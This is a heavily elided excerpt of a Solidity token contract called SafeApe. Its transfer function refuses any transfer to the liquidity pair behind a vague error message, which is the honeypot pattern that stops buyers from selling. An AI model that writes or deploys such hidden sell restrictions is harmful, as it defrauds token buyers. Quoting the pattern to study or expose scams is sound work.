...
contract SAFEAPE is ERC20, Ownable {
    ...
    Taxes public taxes = Taxes(0, 0, 0, 10);
    Taxes public sellTaxes = Taxes(0, 0, 0, 10);
    ...
    constructor(address routerAdd) ERC20("SafeApe", "SAFEAPE") {
    ...
    function _transfer(
        ...
        require(recipient != pair, "Failed Transfer From");
